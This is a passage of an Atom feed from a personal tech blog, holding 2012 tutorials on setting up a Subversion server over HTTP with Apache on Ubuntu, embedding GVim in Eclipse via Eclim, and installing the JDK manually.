href="http://www.dedoimedo.com/computers/gnome-3-fallback.html">Gnome 3 Fallback mode - Get your productivity back</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Although the OS that I like the most is &lt;a href=&quot;http://old-releases.ubuntu.com/releases/natty/&quot;&gt;Ubuntu 11.04&lt;/a&gt;. Unfortunately, a lot</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="fedora" scheme="http://jslim.net/tags/fedora/"/>
    
    <category term="gnome" scheme="http://jslim.net/tags/gnome/"/>
    
  </entry>
  
  <entry>
    <title>Setup Subversion server with HTTP on Ubuntu 11.04</title>
    <link href="http://jslim.net/blog/2012/11/25/setup-subversion-server-with-http-on-ubuntu-11-dot-04/"/>
    <id>http://jslim.net/blog/2012/11/25/setup-subversion-server-with-http-on-ubuntu-11-dot-04/</id>
    <published>2012-11-25T11:43:00.000Z</published>
    <updated>2022-05-09T09:30:48.609Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Install-Apache-server-and-subversion"><a href="#Install-Apache-server-and-subversion" class="headerlink" title="Install Apache server and subversion"></a>Install <a href="http://httpd.apache.org/">Apache</a> server and <a href="http://subversion.apache.org/">subversion</a></h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get <span class="keyword">install </span>apache2 <span class="keyword">subversion </span>libapache2-svn</span><br></pre></td></tr></table></figure><h3 id="Create-repository-to-host-your-projects"><a href="#Create-repository-to-host-your-projects" class="headerlink" title="Create repository to host your projects"></a>Create repository to host your projects</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="regexp">/path/</span>to<span class="regexp">/your/</span>repos</span><br></pre></td></tr></table></figure><h3 id="Create-a-project"><a href="#Create-a-project" class="headerlink" title="Create a project"></a>Create a project</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>svnadmin create project_name</span><br></pre></td></tr></table></figure><h3 id="Edit-the-configuration-file"><a href="#Edit-the-configuration-file" class="headerlink" title="Edit the configuration file"></a>Edit the configuration file</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/etc/</span>apache2<span class="regexp">/mods-enabled/</span>dav_svn.conf</span><br></pre></td></tr></table></figure><p>Uncomment the following lines</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">Location</span> /svn&gt;</span><br><span class="line">    DAV svn</span><br><span class="line">    SVNParentPath /<span class="type">path</span>/<span class="keyword">to</span>/your/repos</span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;Subversion Repository&quot;</span><br><span class="line">    AuthUserFile /etc/apache2/dav_svn.passwd</span><br><span class="line">    &lt;LimitExcept <span class="keyword">GET</span> PROPFIND <span class="keyword">OPTIONS</span> REPORT&gt;</span><br><span class="line">        Require <span class="keyword">valid</span>-<span class="keyword">user</span></span><br><span class="line">    &lt;/LimitExcept&gt;</span><br><span class="line">&lt;/<span class="keyword">Location</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="Create-a-user"><a href="#Create-a-user" class="headerlink" title="Create a user"></a>Create a user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo htpasswd -cm /etc/apache2/dav_svn.passwd your_username</span></span><br></pre></td></tr></table></figure><p><strong>NOTE:<br><code>-c</code> option should only be used on the first time when you create a user as the user doesn’t exists.<br><code>-m</code> option is to specify the MD5 encryption on the password.</strong></p><h3 id="Restart-apache-server"><a href="#Restart-apache-server" class="headerlink" title="Restart apache server"></a>Restart apache server</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo <span class="regexp">/etc/i</span>nit.d/apache2 restart</span><br></pre></td></tr></table></figure><h3 id="Set-user-type-group-for-authorization-Optional"><a href="#Set-user-type-group-for-authorization-Optional" class="headerlink" title="Set user type/group for authorization (Optional)"></a>Set user type/group for authorization <em>(Optional)</em></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi <span class="regexp">/etc/</span>apache2<span class="regexp">/mods-enabled/</span>dav_svn.conf</span><br></pre></td></tr></table></figure><p>Uncomment the following lines</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AuthzSVNAccessFile <span class="regexp">/etc/</span>apache2/dav_svn.authz</span><br></pre></td></tr></table></figure><p>Create a new file</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo vi /etc/apache2/dav_svn.authz</span></span><br></pre></td></tr></table></figure><p>Add few user groups and assign them to a project</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">Create</span> <span class="keyword">user</span> <span class="keyword">group</span></span><br><span class="line">[<span class="keyword">group</span>]</span><br><span class="line">group1 = user1, user2, user3</span><br><span class="line">group2 = user4, user5, user6</span><br><span class="line"></span><br><span class="line"># Assign <span class="keyword">user</span> <span class="keyword">to</span> a project</span><br><span class="line">[proj_name:/<span class="type">path</span>/<span class="keyword">to</span>/proj]</span><br><span class="line">@group1 = rw # Have <span class="keyword">read</span>-<span class="keyword">write</span> <span class="keyword">access</span></span><br><span class="line">@group2 = r  # <span class="keyword">Only</span> have <span class="keyword">read</span> <span class="keyword">access</span>, cannot <span class="keyword">commit</span> the changes</span><br><span class="line">user7 = rw   # A standalone <span class="keyword">user</span> who doesn<span class="string">&#x27;t belongs to any group</span></span><br></pre></td></tr></table></figure><p><strong>NOTE: alias (@) is used to indicate it is a group, the alias must put as a prefix</strong></p><h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ svn co http:<span class="regexp">//</span>localhost<span class="regexp">/svn/</span>project_name project_name</span><br></pre></td></tr></table></figure><p><strong>Caution: For create user group and assign to specific project, it doesn’t work correctly, I still discovering. If you know what I’m wrong, please email to <a href="mailto:jslim89@gmail.com">jslim89@gmail.com</a></strong></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h3 id=&quot;Install-Apache-server-and-subversion&quot;&gt;&lt;a href=&quot;#Install-Apache-server-and-subversion&quot; class=&quot;headerlink&quot; title=&quot;Install Apache</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="subversion" scheme="http://jslim.net/tags/subversion/"/>
    
  </entry>
  
  <entry>
    <title>Embed GVIM into Eclipse with Eclim on Ubuntu</title>
    <link href="http://jslim.net/blog/2012/11/24/embed-gvim-into-eclipse-with-eclim-on-ubuntu/"/>
    <id>http://jslim.net/blog/2012/11/24/embed-gvim-into-eclipse-with-eclim-on-ubuntu/</id>
    <published>2012-11-24T07:55:00.000Z</published>
    <updated>2022-05-09T09:30:48.609Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://eclim.org/">Eclim</a> allowed us to embed <a href="http://www.vim.org/">Vim</a> into <a href="http://www.eclipse.org/">Eclipse</a>.</p><p>Install <a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">JDK</a> and <a href="http://www.eclipse.org/">Eclipse</a>.<br><strong>NOTE: Installation of Eclipse is same as <a href="/blog/2012/11/22/jdk-installation-on-ubuntu/">Installation of JDK</a>. Just have to append <code>export ECLIPSE_HOME=&#39;/opt/eclipse&#39;</code> after the <code>export JAVA_HOME</code> line and append <code>:$&#123;ECLIPSE_HOME&#125;</code> to the end of <code>export PATH</code>.</strong></p><p>To make it on Gnome desktop</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo touch <span class="regexp">/usr/</span>share<span class="regexp">/applications/</span>eclipse.desktop</span><br></pre></td></tr></table></figure><p>Add the content below to the file just created</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Desktop Entry]</span></span><br><span class="line"><span class="attr">Name</span>=Eclipse IDE</span><br><span class="line"><span class="attr">Comment</span>=Eclipse</span><br><span class="line"><span class="attr">Exec</span>=/opt/eclipse/eclipse</span><br><span class="line"><span class="attr">StartupNotify</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">Terminal</span>=<span class="literal">false</span></span><br><span class="line"><span class="attr">Type</span>=Application</span><br><span class="line"><span class="attr">Icon</span>=/opt/eclipse/icon.xpm</span><br><span class="line"><span class="attr">Category</span>=Development<span class="comment">;IDE;</span></span><br></pre></td></tr></table></figure><p>Edit <code>/opt/eclipse/eclipse.ini</code> add</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-vm</span><br><span class="line">/opt/jdk&lt;version&gt;/bin/java</span><br></pre></td></tr></table></figure><p>right before <code>-vmargs</code></p><p>Next is to install <a href="http://eclim.org/">Eclim</a>. (<a href="http://eclim.org/install.html">see more</a>)</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar eclim_&lt;<span class="keyword">version</span>&gt;<span class="string">.jar</span></span><br></pre></td></tr></table></figure><p>Then start Eclipse</p><ul><li>at the eclipse menu bar: <strong>Window</strong> -&gt; <strong>Preferences</strong> -&gt; <strong>Vimplugin</strong> there, make sure the <strong>Path to GVIM</strong> is not blank <em>(usually should be <code>/usr/bin/gvim</code>)</em></li><li>open <strong>Window</strong> -&gt; <strong>Show View</strong> -&gt; <strong>Other</strong> -&gt; <strong>Eclim</strong> -&gt; <strong>eclimd</strong></li><li>Right-click any project source code, select <strong>Open with</strong> -&gt; <strong>Vim</strong></li></ul><p>Happy viming ^^</p><p><em>Reference: <a href="http://stackoverflow.com/questions/5898111/eclipse-not-working-no-java-virtual-machine-was-found">eclipse not working - No java virtual machine was found</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://eclim.org/&quot;&gt;Eclim&lt;/a&gt; allowed us to embed &lt;a href=&quot;http://www.vim.org/&quot;&gt;Vim&lt;/a&gt; into &lt;a</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="vim" scheme="http://jslim.net/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>JDK installation on Ubuntu</title>
    <link href="http://jslim.net/blog/2012/11/22/jdk-installation-on-ubuntu/"/>
    <id>http://jslim.net/blog/2012/11/22/jdk-installation-on-ubuntu/</id>
    <published>2012-11-22T14:25:00.000Z</published>
    <updated>2022-05-09T09:30:48.609Z</updated>
    
    <content type="html"><![CDATA[<p>There may have many ways to install Java on Ubuntu. However, in this example I’ll show the manual way which is download the <a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">JDK</a> from the official website.</p><p>There are few steps here:</p><p>Extract it and move to <code>/opt</code> directory.</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -zxvf jdk_&lt;<span class="keyword">version</span>&gt;<span class="string">.tar.gz</span></span><br><span class="line">$ sudo mv jdk_&lt;<span class="keyword">version</span>&gt; <span class="string">/opt/</span> <span class="comment"># <span class="doctag">NOTE:</span> /opt is a directory like `Program file` in Windows</span></span><br></pre></td></tr></table></figure><p>Add <strong>Java</strong> to <a href="http://en.wikipedia.org/wiki/Environment_variable">Environment Variable</a>.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vi ~/.bash_profile</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Append this two lines:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  <span class="built_in">export</span> JAVA_HOME=<span class="string">&#x27;/opt/jdk_&lt;version&gt;/bin&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Press :wq to save it</span></span><br></pre></td></tr></table></figure><p>Activate the bash profile for immediate effect.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> ~/.bash_profile</span></span><br></pre></td></tr></table></figure><p>Re-open terminal (i.e. <code>CTRL + ALT + T</code> for shortcut)</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>java -showversion</span><br></pre></td></tr></table></figure><p>It should work. Have fun :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;There may have many ways to install Java on Ubuntu. However, in this example I’ll show the manual way which is download the &lt;a</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
  </entry>
  
</feed>
